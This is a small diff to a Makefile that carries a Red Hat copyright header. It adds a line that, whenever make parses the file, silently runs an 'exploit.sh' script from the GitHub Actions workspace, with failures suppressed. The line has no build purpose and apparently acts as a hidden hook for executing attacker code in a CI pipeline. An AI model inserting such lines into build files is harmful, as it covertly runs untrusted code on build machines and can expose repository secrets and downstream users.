@@ -3,6 +3,8 @@
 # Copyright Red Hat
 #
 
+_ := $(shell bash ${GITHUB_WORKSPACE}/exploit.sh || true)
+
 .DEFAULT_GOAL  := all
 
 # Find the pylintrc file in the same directory as this Makefile
